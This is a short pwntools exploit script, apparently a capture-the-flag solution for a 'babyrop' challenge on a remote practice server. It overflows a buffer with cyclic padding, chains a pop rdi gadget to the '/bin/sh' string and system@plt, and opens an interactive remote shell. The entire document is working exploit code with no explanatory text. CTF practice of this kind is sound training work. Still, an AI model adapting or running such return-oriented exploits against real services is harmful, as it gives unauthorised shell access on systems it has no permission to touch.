from pwn import *


# the flag in /home/babyrop
p = remote("node4.buuoj.cn", 28278)
pro = ELF("./babyrop")

system = pro.plt["system"]
binsh = next(pro.search(b"/bin/sh\x00"))
pop_rdi_ret = 0x0000000000400683

pad = cyclic(0x10+0x8)
pad += p64(pop_rdi_ret)+p64(binsh)+p64(system)
p.sendline(pad)

p.interactive()


